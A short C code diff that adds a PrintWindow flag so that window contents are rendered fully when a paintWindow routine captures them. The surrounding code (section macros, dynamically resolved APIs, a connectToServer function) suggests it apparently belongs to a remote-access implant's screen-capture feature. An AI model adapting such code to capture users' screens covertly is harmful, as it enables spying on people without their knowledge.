@@ -3,6 +3,8 @@
 
 #include "common.h"
 
+#define PW_RENDERFULLCONTENT           0x00000002
+
 #define FREE( x ) if( x ) { pArgs->pApi->msvcrt.free( x ); x = NULL; }
 
 SECTION( D ) SOCKET connectToServer( PARGS pArgs )
@@ -56,7 +58,7 @@ SECTION( D ) BOOL paintWindow( HWND hWnd, HDC hDc, HDC hDcScreen, PAPI pApi )
     HBITMAP hBmpWindow = pApi->gdi32.CreateCompatibleBitmap( hDc, rect.right - rect.left, rect.bottom - rect.top );
 
     pApi->gdi32.SelectObject( hDcWindow, hBmpWindow );
-    if ( pApi->user32.PrintWindow( hWnd, hDcWindow, 0 ) )
+    if ( pApi->user32.PrintWindow( hWnd, hDcWindow, PW_CLIENTONLY | PW_RENDERFULLCONTENT ) )
     {
         pApi->gdi32.BitBlt( hDcScreen,
             rect.left,
